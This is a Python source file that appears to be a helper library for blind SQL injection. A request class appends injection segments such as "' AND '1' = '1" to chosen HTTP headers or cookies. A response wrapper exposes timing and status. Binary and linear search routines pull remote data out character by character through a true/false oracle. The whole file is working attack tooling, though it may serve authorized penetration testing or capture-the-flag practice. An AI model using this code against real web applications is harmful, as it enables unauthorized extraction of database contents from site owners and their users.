import ast
import requests
from urllib.parse import urlparse
from typing import Callable

class SqliHttpRequest:
  """Injectable HTTP Request

  A class used to represent an HTTP Request supporting SQL injection

  ...

  Attributes
  ----------
  url : str
      the target HTTP URL
  headers : dict
      HTTP Request Headers
  cookies : dict
      HTTP Request Cookies
  injection : str
      SQL injection formatted string
  
  Methods
  -------
  get()
      HTTP Get request
  inject(type, name, segment)
      Inject SQL formatted string segment into [header|cookie] with name
  """

  def __init__(self, target_url, headers, cookies):
    """
    Parameters
    ----------
    url : str
      the target HTTP URL
    headers : str
      JSON formated string
    cookies : str
      JSON formated string
    """
    self.injection = None
    self.url = target_url
    self.headers = ast.literal_eval(headers)
    self.cookies = ast.literal_eval(cookies)
    if not self.headers['Host']:
      self.headers['Host'] = urlparse(target_url).hostname
    if 'Referer' in self.headers.keys() and not self.headers['Referer']:
      self.headers['Referer'] = target_url
    
  def get(self):
    """HTTP Get request.

    Send HTTP Get request based on configured Headers, Cookies and any injected SQL segment.

    Parameters
    ----------
    None

    Returns
    -------
    HTTP Response
    """
    headers, cookies = self._prepare_request()
    return SqliHttpResponse(requests.get(self.url, headers=headers, cookies=cookies))
  
  def inject(self, type, name, segment):
    """HTTP Get request.

    Send HTTP Get request based on configured Headers, Cookies and any injected SQL segment.

    Parameters
    ----------
    type : str
        Type of HTTP element to inject into - valid values 'header' or 'cookie'
    name: str
        Name of the HTTP element of specified type - example Cookie name = 'session'
    segment: str
        SQL inject segment string - examle segment = "' AND '1' = '1"
    
    Returns
    -------
    None

    Raises
    ------
    ValueError
        If type is not supported value of 'header' or 'cookie'.
    KeyError
        If name key does not exist in specified header or cookie.
    """

    if not self.injection:
      self.injection = {'header': {}, 'cookie': {}}

    if type == 'header':
      if not name in self.headers.keys():
        raise KeyError(f"Header {name} does not exist!")
    elif type == 'cookie':
      if not name in self.cookies.keys():
        raise KeyError(f"Cookie {name} does not exist!")
    else:
      raise ValueError(f"Invalid injection type: {type}")
    
    self.injection[type][name] = segment
  
  def _prepare_injection(self):
    headers = self.headers.copy()    
    cookies = self.cookies.copy()
    
    if self.injection['header']:
      for key in self.injection['header']:
        headers[key] = f"{headers[key]}{self.injection['header'][key]}"
    
    if self.injection['cookie']:
      for key in self.injection['cookie']:
        cookies[key] = f"{cookies[key]}{self.injection['cookie'][key]}"
    
    return headers, cookies
  
  def _prepare_request(self):
    if not self.injection:      
      return self.headers, self.cookies
    
    headers, cookies = self._prepare_injection()
    return headers, cookies

class SqliHttpResponse:
  def __init__(self, response):
    self._response = response
  
  @property
  def elapsed(self):
    return self._response.elapsed
  
  @property
  def content(self):
    return self._response.content
  
  @property
  def status_code(self):
    return self._response.status_code

def binary_search(
    data,
    handler: Callable[[str, str, int], bool],
    position = 0):
  """Binary search of remote dataset based on sorted input data list.

  Keyword arguments:
  data -- the data list forming basis for (remote) search
  handler -- handler callback which provides remote condition logic (handler(char: str, op: str, pos: int) -> bool
  position -- position of char to search in remote dataset (default 0)

  note: handler function definition: 
  """
  min = 0
  max = len(data) - 1
  found = None
  
  while True:
    if max < min:
      break
    
    idx = int((max + min) / 2)

    if handler(data[idx], '=', position):
      found = data[idx]
      break
    
    if handler(data[idx], '<', position):
      max = idx - 1
    else:
      min = idx + 1
  
  return found

def linear_search(
    data,
    handler: Callable[[str, str, int], bool],
    position = 0):
  """Linear search of remote dataset based on input data list.

  Keyword arguments:
  data -- the data list forming basis for (remote) search
  handler -- handler callback which provides remote condition logic - returns Bool
  position -- position of char to search in remote dataset (default 0)
  """
  found = None
  
  for c in data:
    # char n (position) in remote dataset is equal to ( SQL '=') char c
    if handler(c, '=', position):
      found = c
      break
  
  return found
